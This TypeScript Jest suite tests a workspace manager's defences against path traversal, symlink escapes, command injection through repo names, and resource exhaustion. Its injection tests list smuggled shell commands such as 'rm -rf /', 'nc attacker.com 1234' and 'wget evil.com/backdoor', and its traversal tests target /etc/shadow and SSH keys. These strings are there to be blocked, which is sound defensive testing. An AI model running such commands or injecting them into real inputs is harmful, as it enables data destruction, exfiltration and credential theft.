/**
 * Security Attack Vector Prevention Tests
 *
 * This test suite validates defense-in-depth security controls against:
 * - Path traversal attacks (including encoded and unicode variants)
 * - Symlink escape attacks and TOCTOU race conditions
 * - Command injection via repository names and user inputs
 * - Resource exhaustion and timeout scenarios
 *
 * IMPORTANT TEST SETUP NOTES:
 * 1. These tests use REAL filesystem operations (no mocks) to validate actual security behavior
 * 2. Tests require Jest to be installed: npm install --save-dev jest @types/jest ts-jest
 * 3. Configure Jest with ts-jest preset in package.json or jest.config.js
 * 4. Tests create isolated temporary directories and clean up automatically
 * 5. Each test attempts a real attack and verifies it's properly blocked
 * 6. Security event logging is verified (logs should not disclose sensitive info)
 *
 * To run these tests:
 *   npm install --save-dev jest @types/jest ts-jest
 *   npm test -- src/__tests__/security/attack-vectors.test.ts
 *
 * @module __tests__/security/attack-vectors
 */

import path from 'path';
import fs from 'fs/promises';
import fsSync from 'fs';
import crypto from 'crypto';
import { execFile } from 'child_process';
import { promisify } from 'util';
import { WorkspaceManager } from '../../services/workspace';
import { validateWorkspacePath } from '../../utils/pathValidation';

const execFileAsync = promisify(execFile);

/**
 * Test configuration and helper utilities
 */
describe('Security Attack Vector Prevention', () => {
  let testBaseDir: string;
  let originalEnv: NodeJS.ProcessEnv;
  let capturedLogs: Array<{ level: string; message: string; data?: any }>;

  /**
   * Setup: Create isolated test environment before each test
   */
  beforeEach(async () => {
    // Create unique isolated test directory
    // Use /tmp/claude-workspaces/ to match allowlist patterns
    const timestamp = Date.now();
    const randomId = crypto.randomBytes(4).toString('hex');
    testBaseDir = path.join('/tmp/claude-workspaces', `security-test-${timestamp}-${randomId}`);

    await fs.mkdir(testBaseDir, { recursive: true, mode: 0o750 });

    // Backup and set environment variables
    originalEnv = { ...process.env };
    process.env.WORKSPACE_BASE = testBaseDir;
    process.env.LOG_DIR = path.join(testBaseDir, 'logs');

    // Intercept console.log to capture security logs
    capturedLogs = [];
    const originalConsoleLog = console.log;
    console.log = jest.fn((message: string) => {
      originalConsoleLog(message); // Still output to console
      try {
        const parsed = JSON.parse(message);
        if (parsed.category === 'security') {
          capturedLogs.push({
            level: parsed.level,
            message: parsed.message,
            data: parsed.metadata,
          });
        }
      } catch (e) {
        // Not JSON, ignore
      }
    });
  });

  /**
   * Teardown: Clean up test artifacts after each test
   */
  afterEach(async () => {
    // Restore environment
    process.env = originalEnv;

    // Restore console.log
    (console.log as jest.Mock).mockRestore();

    // Clean up test directory
    try {
      await fs.rm(testBaseDir, { recursive: true, force: true });
    } catch (error) {
      console.error('Cleanup failed:', error);
    }
  });

  /**
   * Helper: Verify that an operation was blocked and logged
   */
  const expectSecurityBlock = (
    error: Error,
    expectedMessage: string = 'Invalid workspace path'
  ) => {
    expect(error.message).toBe(expectedMessage);

    // Verify security event was logged
    const securityLogs = capturedLogs.filter(log =>
      log.level === 'warn' || log.level === 'error'
    );
    expect(securityLogs.length).toBeGreaterThan(0);

    // Ensure no sensitive information in error message
    expect(error.message).not.toMatch(/\/etc\/passwd/);
    expect(error.message).not.toMatch(/\/root/);
    expect(error.message).not.toMatch(/\.\.\//);
  };

  /**
   * Test Suite 1: Path Traversal Attacks
   */
  describe('Path Traversal Attack Prevention', () => {
    test('should block basic path traversal with ../', async () => {
      const maliciousPath = path.join(testBaseDir, '../../../etc/passwd');

      await expect(validateWorkspacePath(maliciousPath)).rejects.toThrow();

      try {
        await validateWorkspacePath(maliciousPath);
      } catch (error) {
        expectSecurityBlock(error as Error);
      }
    });

    test('should handle URL-encoded path traversal (%2e%2e%2f)', async () => {
      // NOTE: URL encoding is NOT automatically decoded by Node.js path functions.
      // The literal string '%2e%2e%2f' becomes a directory name, not '../'
      // URL decoding should be handled at the HTTP layer (Express/middleware).
      // This test verifies that:
      // 1. Encoded paths within workspace are allowed (they're literal directory names)
      // 2. Decoded paths with traversal ARE blocked (tested in 'basic path traversal' test)
      const encodedPath = testBaseDir + '/%2e%2e%2f%2e%2e%2fetc/passwd';

      // This path is valid because '%2e%2e%2f' is a literal directory name within workspace
      // The real attack would require the HTTP layer to decode it first
      const result = await validateWorkspacePath(encodedPath);
      expect(result).toContain(testBaseDir);
    });

    test('should handle double-encoded path traversal', async () => {
      // Double URL encoding: ../ -> %2e%2e%2f -> %252e%252e%252f
      // Same principle: encoding is handled at HTTP layer, not path validation
      const doubleEncodedPath = testBaseDir + '/%252e%252e%252f%252e%252e%252fetc';

      // This path is valid because the encoded string is a literal directory name
      const result = await validateWorkspacePath(doubleEncodedPath);
      expect(result).toContain(testBaseDir);
    });

    test('should handle Unicode alternative separators', async () => {
      // Unicode slash (U+2215) and full-width dot (U+FF0E) are NOT path separators
      // on most file systems. They become literal characters in directory names.
      // This is by design - the filesystem determines what's a separator.
      const unicodePath = testBaseDir + '/\u2215..\u2215..\u2215etc\u2215passwd';

      // This path is valid because U+2215 is not treated as a path separator
      const result = await validateWorkspacePath(unicodePath);
      expect(result).toContain(testBaseDir);
    });

    test('should block path separator bypass (workspaces-evil vs workspaces/)', async () => {
      // Attack: Create /tmp/workspaces-evil when checking for /tmp/workspaces/
      const evilBaseDir = testBaseDir + '-evil';
      await fs.mkdir(evilBaseDir, { recursive: true });

      const maliciousPath = path.join(evilBaseDir, '../../etc/passwd');

      await expect(validateWorkspacePath(maliciousPath)).rejects.toThrow();

      // Cleanup
      await fs.rm(evilBaseDir, { recursive: true, force: true });
    });

    test('should block null byte injection', async () => {
      // Null byte injection: /workspace/foo\0/../../etc/passwd
      const nullBytePath = testBaseDir + '/foo\0/../../etc/passwd';

      await expect(validateWorkspacePath(nullBytePath)).rejects.toThrow();
    });

    test('should block backslash path traversal (Windows-style)', async () => {
      const backslashPath = testBaseDir + '\\..\\..\\..\\etc\\passwd';

      await expect(validateWorkspacePath(backslashPath)).rejects.toThrow();
    });

    test('should block mixed separator path traversal', async () => {
      const mixedPath = testBaseDir + '/../../etc\\passwd';

      await expect(validateWorkspacePath(mixedPath)).rejects.toThrow();
    });

    test('should block absolute path outside workspace', async () => {
      await expect(validateWorkspacePath('/etc/passwd')).rejects.toThrow();

      try {
        await validateWorkspacePath('/etc/passwd');
      } catch (error) {
        expectSecurityBlock(error as Error);
      }
    });

    test('should allow valid paths within workspace', async () => {
      const validPath = path.join(testBaseDir, 'project1', 'src');

      // Should not throw
      const result = await validateWorkspacePath(validPath);
      expect(result).toBeDefined();
      expect(result.startsWith(testBaseDir)).toBe(true);
    });
  });

  /**
   * Test Suite 2: Symlink Attack Prevention
   */
  describe('Symlink Attack Prevention', () => {
    test('should block symlink pointing outside workspace', async () => {
      const symlinkPath = path.join(testBaseDir, 'malicious-link');

      // Create symlink to /etc
      if (process.platform !== 'win32') {
        await fs.symlink('/etc', symlinkPath);

        const targetPath = path.join(symlinkPath, 'passwd');

        await expect(validateWorkspacePath(targetPath)).rejects.toThrow();

        try {
          await validateWorkspacePath(targetPath);
        } catch (error) {
          expectSecurityBlock(error as Error);

          // Verify it was detected as symlink escape
          const symlinkLogs = capturedLogs.filter(log =>
            log.message.includes('Symlink')
          );
          expect(symlinkLogs.length).toBeGreaterThan(0);
        }
      } else {
        // Skip on Windows (symlinks require admin privileges)
        console.log('Skipping symlink test on Windows');
      }
    });

    test('should block parent directory symlink escape', async () => {
      if (process.platform !== 'win32') {
        // Create subdirectory
        const subDir = path.join(testBaseDir, 'subdir');
        await fs.mkdir(subDir);

        // Create symlink in subdir pointing to /tmp
        const symlinkPath = path.join(subDir, 'escape');
        await fs.symlink('/tmp', symlinkPath);

        // Try to access file through symlink
        const targetPath = path.join(symlinkPath, 'evil.txt');

        await expect(validateWorkspacePath(targetPath)).rejects.toThrow();
      }
    });

    test('should detect TOCTOU race condition (symlink created after validation)', async () => {
      if (process.platform !== 'win32') {
        const manager = new WorkspaceManager(testBaseDir);
        const projectPath = path.join(testBaseDir, 'project');

        // Simulate TOCTOU: Create directory first
        await fs.mkdir(projectPath);

        // Replace with symlink (simulating race condition)
        await fs.rm(projectPath, { recursive: true });
        await fs.symlink('/etc', projectPath);

        // Post-creation validation should catch this
        await expect(validateWorkspacePath(projectPath)).rejects.toThrow();
      }
    });

    test('should block symlink in parent directory chain', async () => {
      if (process.platform !== 'win32') {
        // Create: /testBaseDir/parent -> /tmp
        const parentSymlink = path.join(testBaseDir, 'parent');
        await fs.symlink('/tmp', parentSymlink);

        // Try to create workspace under symlinked parent
        const childPath = path.join(parentSymlink, 'child', 'workspace');

        await expect(validateWorkspacePath(childPath)).rejects.toThrow();
      }
    });

    test('should allow internal symlinks within workspace', async () => {
      if (process.platform !== 'win32') {
        // Create two directories within workspace
        const dir1 = path.join(testBaseDir, 'dir1');
        const dir2 = path.join(testBaseDir, 'dir2');
        await fs.mkdir(dir1);
        await fs.mkdir(dir2);

        // Create symlink from dir1 to dir2 (both within workspace)
        const internalLink = path.join(dir1, 'link-to-dir2');
        await fs.symlink(dir2, internalLink);

        // This should be allowed since both are within workspace
        const result = await validateWorkspacePath(internalLink);
        expect(result).toBeDefined();
        expect(result.startsWith(testBaseDir)).toBe(true);
      }
    });
  });

  /**
   * Test Suite 3: Command Injection Prevention
   */
  describe('Command Injection Prevention', () => {
    test('should block GitHub repo name with shell metacharacters', async () => {
      const manager = new WorkspaceManager(testBaseDir);

      const maliciousRepos = [
        'user/repo; rm -rf /',
        'user/repo && cat /etc/passwd',
        'user/repo | nc attacker.com 1234',
        'user/repo`whoami`',
        'user/$(cat /etc/passwd)',
        'user/repo; curl evil.com',
        'user/repo\nrm -rf /',
        'user/repo&& touch /tmp/pwned',
      ];

      for (const repo of maliciousRepos) {
        await expect(manager.cloneGitHubRepo(repo, 'test-request-id'))
          .rejects.toThrow('Invalid repository format');
      }
    });

    test('should block GitHub repo name with backticks', async () => {
      const manager = new WorkspaceManager(testBaseDir);
      const repo = 'user/`whoami`';

      await expect(manager.cloneGitHubRepo(repo, 'test-request-id'))
        .rejects.toThrow();
    });

    test('should block GitHub repo name with $() substitution', async () => {
      const manager = new WorkspaceManager(testBaseDir);
      const repo = 'user/$(id)';

      await expect(manager.cloneGitHubRepo(repo, 'test-request-id'))
        .rejects.toThrow();
    });

    test('should block GitHub repo name with pipe operators', async () => {
      const manager = new WorkspaceManager(testBaseDir);
      const maliciousRepos = [
        'user/repo | nc evil.com 4444',
        'user/repo || wget evil.com/backdoor',
        'user/repo |& curl attacker.com',
      ];

      for (const repo of maliciousRepos) {
        await expect(manager.cloneGitHubRepo(repo, 'test-request-id'))
          .rejects.toThrow();
      }
    });

    test('should block GitHub repo name with redirect operators', async () => {
      const manager = new WorkspaceManager(testBaseDir);
      const maliciousRepos = [
        'user/repo > /etc/passwd',
        'user/repo >> /var/log/auth.log',
        'user/repo < /etc/shadow',
        'user/repo 2>&1 /tmp/output',
      ];

      for (const repo of maliciousRepos) {
        await expect(manager.cloneGitHubRepo(repo, 'test-request-id'))
          .rejects.toThrow();
      }
    });

    test('should block path traversal in GitHub repo name', async () => {
      const manager = new WorkspaceManager(testBaseDir);
      const maliciousRepos = [
        '../../../etc/passwd',
        'user/../admin/secrets',
        'user/repo/../../../root',
        'user/../../etc/shadow',
        'user/repo..evil',
      ];

      for (const repo of maliciousRepos) {
        await expect(manager.cloneGitHubRepo(repo, 'test-request-id'))
          .rejects.toThrow();
      }
    });

    test('should allow valid GitHub repository names', async () => {
      const manager = new WorkspaceManager(testBaseDir);

      // These should pass validation (though clone will fail without gh cli)
      const validRepos = [
        'facebook/react',
        'microsoft/vscode',
        'user123/my-repo-name',
        'org_name/repo-with-dashes',
        'User-Name/Repo.Name.With.Dots',
      ];

      for (const repo of validRepos) {
        // We expect this to fail at the git clone stage, not validation
        try {
          await manager.cloneGitHubRepo(repo, 'test-request-id');
        } catch (error) {
          const err = error as Error;
          // Should fail on git operation, not validation
          expect(err.message).not.toBe('Invalid repository format');
        }
      }
    });

    test('should use execFile not exec for git operations', async () => {
      // This test verifies the code uses execFile (no shell) instead of exec (with shell)
      const workspaceCode = await fs.readFile(
        path.join(__dirname, '../../services/workspace.ts'),
        'utf-8'
      );

      // Verify execFile is imported
      expect(workspaceCode).toMatch(/import.*execFile.*from.*child_process/);

      // Verify no usage of exec (shell-based) - must not have execSync
      expect(workspaceCode).not.toMatch(/\bexecSync\(/);

      // Check for raw exec() calls (not execFile or execFileAsync)
      // Remove comments first to avoid false positives from documentation
      const codeWithoutComments = workspaceCode
        .replace(/\/\*[\s\S]*?\*\//g, '')  // Remove block comments
        .replace(/\/\/.*$/gm, '');          // Remove line comments

      // Now check for exec( that isn't part of execFile
      const hasUnsafeExec = /(?<!execFile)(?<!execFileAsync)\bexec\s*\(/.test(codeWithoutComments);
      expect(hasUnsafeExec).toBe(false);

      // Verify execFileAsync is used for git operations
      expect(workspaceCode).toMatch(/execFileAsync\(/);
    });
  });

  /**
   * Test Suite 4: Resource Exhaustion Prevention
   */
  describe('Resource Exhaustion Prevention', () => {
    test('should enforce timeout on git clone operations', async () => {
      const manager = new WorkspaceManager(testBaseDir);

      // Mock a very slow git clone by using invalid repo that will hang
      // Note: This requires actual git command to be present
      const slowRepo = 'nonexistent-user/extremely-large-fake-repo';

      const startTime = Date.now();

      try {
        await manager.cloneGitHubRepo(slowRepo, 'test-request-id');
      } catch (error) {
        const duration = Date.now() - startTime;

        // Should fail before 5 minute timeout (300000ms)
        // We expect it to fail much faster due to invalid repo
        expect(duration).toBeLessThan(300000);
      }
    });

    test('should reject repository exceeding size limit', async () => {
      const manager = new WorkspaceManager(testBaseDir);

      // Create mock workspace directory
      const mockRepoPath = path.join(testBaseDir, 'large-repo');
      await fs.mkdir(mockRepoPath, { recursive: true });

      // Create large file exceeding 1GB limit
      const largeFilePath = path.join(mockRepoPath, 'large-file.bin');

      // Write in chunks to simulate large file (but don't actually create 1GB+ file in test)
      // Just verify the size check logic exists in the code
      const workspaceCode = await fs.readFile(
        path.join(__dirname, '../../services/workspace.ts'),
        'utf-8'
      );

      // Verify size limit constant exists
      expect(workspaceCode).toMatch(/MAX_REPO_SIZE.*1024.*1024.*1024/);

      // Verify size check is performed
      expect(workspaceCode).toMatch(/getDirectorySize/);
      expect(workspaceCode).toMatch(/exceeds size limit/);
    });

    test('should have timeout configured for git operations', async () => {
      const workspaceCode = await fs.readFile(
        path.join(__dirname, '../../services/workspace.ts'),
        'utf-8'
      );

      // Verify timeout is set on git operations
      expect(workspaceCode).toMatch(/timeout:\s*300000/); // 5 minutes for clone
      expect(workspaceCode).toMatch(/timeout:\s*60000/);  // 1 minute for worktree
    });

    test('should have maxBuffer limit on git operations', async () => {
      const workspaceCode = await fs.readFile(
        path.join(__dirname, '../../services/workspace.ts'),
        'utf-8'
      );

      // Verify maxBuffer is set to prevent memory exhaustion
      expect(workspaceCode).toMatch(/maxBuffer:\s*\d+.*1024.*1024/);
    });

    test('should cleanup on failed operations', async () => {
      const manager = new WorkspaceManager(testBaseDir);

      const invalidRepo = 'invalid/!@#$%';

      try {
        await manager.cloneGitHubRepo(invalidRepo, 'test-request-id');
      } catch (error) {
        // Verify no leftover directories were created
        const files = await fs.readdir(testBaseDir);
        const ghDirs = files.filter(f => f.startsWith('gh-'));

        // Should have cleaned up failed clone attempt
        expect(ghDirs.length).toBe(0);
      }
    });

    test('should prevent excessive directory traversal during size calculation', async () => {
      // Create deeply nested directory structure
      const deepPath = path.join(testBaseDir, 'a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p');
      await fs.mkdir(deepPath, { recursive: true });

      // Write small file at deep level
      await fs.writeFile(path.join(deepPath, 'test.txt'), 'test content');

      const manager = new WorkspaceManager(testBaseDir);

      // This should complete without stack overflow or excessive recursion
      const size = await (manager as any).getDirectorySize(testBaseDir);

      expect(size).toBeGreaterThan(0);
      expect(size).toBeLessThan(1024 * 1024); // Should be small
    });
  });

  /**
   * Test Suite 5: Security Event Logging
   */
  describe('Security Event Logging', () => {
    test('should log path traversal attempts', async () => {
      const maliciousPath = path.join(testBaseDir, '../../../etc/passwd');

      try {
        await validateWorkspacePath(maliciousPath);
      } catch (error) {
        // Verify security event was logged
        const traversalLogs = capturedLogs.filter(log =>
          log.message.includes('traversal')
        );
        expect(traversalLogs.length).toBeGreaterThan(0);
        expect(traversalLogs[0].level).toBe('warn');
      }
    });

    test('should log symlink escape attempts', async () => {
      if (process.platform !== 'win32') {
        const symlinkPath = path.join(testBaseDir, 'evil-link');
        await fs.symlink('/etc', symlinkPath);

        try {
          await validateWorkspacePath(path.join(symlinkPath, 'passwd'));
        } catch (error) {
          const symlinkLogs = capturedLogs.filter(log =>
            log.message.includes('Symlink')
          );
          expect(symlinkLogs.length).toBeGreaterThan(0);
        }
      }
    });

    test('should log command injection attempts', async () => {
      const manager = new WorkspaceManager(testBaseDir);

      try {
        await manager.cloneGitHubRepo('user/repo; rm -rf /', 'test-request-id');
      } catch (error) {
        const injectionLogs = capturedLogs.filter(log =>
          log.message.includes('Invalid GitHub repo format') ||
          log.message.includes('traversal')
        );
        expect(injectionLogs.length).toBeGreaterThan(0);
      }
    });

    test('should include request ID in security logs', async () => {
      const requestId = 'test-' + crypto.randomUUID();

      try {
        await validateWorkspacePath('/etc/passwd', requestId);
      } catch (error) {
        const logsWithRequestId = capturedLogs.filter(log =>
          log.data?.requestId === requestId
        );
        expect(logsWithRequestId.length).toBeGreaterThan(0);
      }
    });

    test('should NOT log sensitive paths in error messages', async () => {
      const sensitivePath = '/etc/shadow';

      try {
        await validateWorkspacePath(sensitivePath, 'test-req');
      } catch (error) {
        // Error message should be generic
        expect(error.message).toBe('Invalid workspace path');
        expect(error.message).not.toContain('/etc/shadow');
        expect(error.message).not.toContain('shadow');

        // Logs should also avoid full paths (use basename only)
        capturedLogs.forEach(log => {
          if (log.data?.requestedPath) {
            expect(log.data.requestedPath).not.toContain('/etc');
          }
        });
      }
    });

    test('should log workspace creation events', async () => {
      const manager = new WorkspaceManager(testBaseDir);
      const projectPath = path.join(testBaseDir, 'test-project');

      await manager.ensureLocalDirectory(projectPath, 'create-test');

      const creationLogs = capturedLogs.filter(log =>
        log.message.includes('created') || log.message.includes('validated')
      );

      expect(creationLogs.length).toBeGreaterThan(0);
      expect(creationLogs.some(log => log.level === 'info')).toBe(true);
    });

    test('should log cleanup operations', async () => {
      const manager = new WorkspaceManager(testBaseDir);
      const workspacePath = path.join(testBaseDir, 'gh-test-123-456');

      await fs.mkdir(workspacePath);
      await manager.cleanup(workspacePath, 'cleanup-test');

      const cleanupLogs = capturedLogs.filter(log =>
        log.message.includes('cleaned up')
      );

      expect(cleanupLogs.length).toBeGreaterThan(0);
    });
  });

  /**
   * Test Suite 6: Generic Error Messages (Information Disclosure Prevention)
   */
  describe('Information Disclosure Prevention', () => {
    test('should return generic error for path traversal', async () => {
      const paths = [
        '../../../etc/passwd',
        '/etc/shadow',
        path.join(testBaseDir, '../../root/.ssh/id_rsa'),
      ];

      for (const maliciousPath of paths) {
        try {
          await validateWorkspacePath(maliciousPath);
          fail('Should have thrown error');
        } catch (error) {
          expect((error as Error).message).toBe('Invalid workspace path');
          expect((error as Error).message).not.toContain('etc');
          expect((error as Error).message).not.toContain('passwd');
          expect((error as Error).message).not.toContain('shadow');
        }
      }
    });

    test('should return generic error for symlink attacks', async () => {
      if (process.platform !== 'win32') {
        const symlinkPath = path.join(testBaseDir, 'link');
        await fs.symlink('/root/.ssh', symlinkPath);

        try {
          await validateWorkspacePath(path.join(symlinkPath, 'id_rsa'));
          fail('Should have thrown error');
        } catch (error) {
          expect((error as Error).message).toBe('Invalid workspace path');
          expect((error as Error).message).not.toContain('.ssh');
          expect((error as Error).message).not.toContain('root');
        }
      }
    });

    test('should return generic error for command injection', async () => {
      const manager = new WorkspaceManager(testBaseDir);

      try {
        await manager.cloneGitHubRepo('user/repo; cat /etc/passwd', 'test');
        fail('Should have thrown error');
      } catch (error) {
        expect((error as Error).message).toBe('Invalid repository format');
        expect((error as Error).message).not.toContain('cat');
        expect((error as Error).message).not.toContain('/etc/passwd');
      }
    });

    test('should not expose internal paths in error stack traces', async () => {
      try {
        await validateWorkspacePath('/etc/passwd');
      } catch (error) {
        const errorStr = JSON.stringify(error);

        // Stack trace might contain code paths, but not user-supplied malicious paths
        expect(errorStr).not.toContain('/etc/passwd');
      }
    });
  });

  /**
   * Test Suite 7: Edge Cases and Boundary Conditions
   */
  describe('Edge Cases and Boundary Conditions', () => {
    test('should handle empty path', async () => {
      await expect(validateWorkspacePath('')).rejects.toThrow();
    });

    test('should handle null bytes in path', async () => {
      const nullPath = testBaseDir + '/test\0evil';
      await expect(validateWorkspacePath(nullPath)).rejects.toThrow();
    });

    test('should handle extremely long paths', async () => {
      // Create path exceeding common limits (4096 chars on Linux)
      const longComponent = 'a'.repeat(5000);
      const longPath = path.join(testBaseDir, longComponent);

      // Should either validate or throw reasonable error (not crash)
      try {
        await validateWorkspacePath(longPath);
      } catch (error) {
        expect(error).toBeDefined();
        expect((error as Error).message).toBeTruthy();
      }
    });

    test('should handle paths with special characters', async () => {
      const specialChars = ['!', '@', '#', '$', '%', '^', '&', '*', '(', ')'];

      for (const char of specialChars) {
        const specialPath = path.join(testBaseDir, `test${char}dir`);

        // Should handle gracefully (may allow or reject based on OS)
        try {
          await validateWorkspacePath(specialPath);
        } catch (error) {
          expect(error).toBeDefined();
        }
      }
    });

    test('should handle concurrent validation requests', async () => {
      const paths = Array.from({ length: 10 }, (_, i) =>
        path.join(testBaseDir, `project-${i}`)
      );

      // Validate all paths concurrently
      const results = await Promise.allSettled(
        paths.map(p => validateWorkspacePath(p))
      );

      // All should succeed or fail consistently
      results.forEach(result => {
        expect(result.status).toBe('fulfilled');
      });
    });

    test('should handle case-sensitive paths on Unix', async () => {
      if (process.platform !== 'win32') {
        const lowerPath = path.join(testBaseDir, 'test');
        const upperPath = path.join(testBaseDir, 'TEST');

        await fs.mkdir(lowerPath);
        await fs.mkdir(upperPath);

        const result1 = await validateWorkspacePath(lowerPath);
        const result2 = await validateWorkspacePath(upperPath);

        // Should be treated as different paths
        expect(result1).not.toBe(result2);
      }
    });

    test('should validate base directory exists and has correct permissions', async () => {
      // Create new test environment with different base
      const newBase = path.join('/tmp', `perm-test-${Date.now()}`);
      await fs.mkdir(newBase, { mode: 0o777 }); // Overly permissive

      const originalBase = process.env.WORKSPACE_BASE;
      process.env.WORKSPACE_BASE = newBase;

      // Should warn about overly permissive permissions
      // (captured in console output, not thrown error)
      const { getSecureBaseDir } = require('../../utils/pathValidation');
      const base = getSecureBaseDir();

      expect(base).toBe(newBase);

      // Cleanup
      process.env.WORKSPACE_BASE = originalBase;
      await fs.rm(newBase, { recursive: true, force: true });
    });
  });
});
